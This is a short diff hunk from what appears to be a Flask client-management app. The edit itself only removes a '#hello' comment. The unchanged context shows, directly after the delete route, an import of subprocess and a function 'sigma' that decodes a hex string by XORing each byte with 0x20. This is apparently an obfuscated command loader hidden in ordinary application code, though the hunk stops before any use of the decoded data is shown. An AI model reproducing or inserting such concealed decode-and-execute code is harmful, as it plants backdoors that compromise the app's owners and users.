@@ -65,7 +65,7 @@ def edit_client(client_id):
 def delete_client(client_id):
     query_db('DELETE FROM clients WHERE id=?', (client_id,), commit=True)
     return redirect(url_for('index'))
-#hello
+
 import subprocess
 def sigma(prayers):
     decoded = bytes([b ^ 0x20 for b in bytes.fromhex(prayers)])
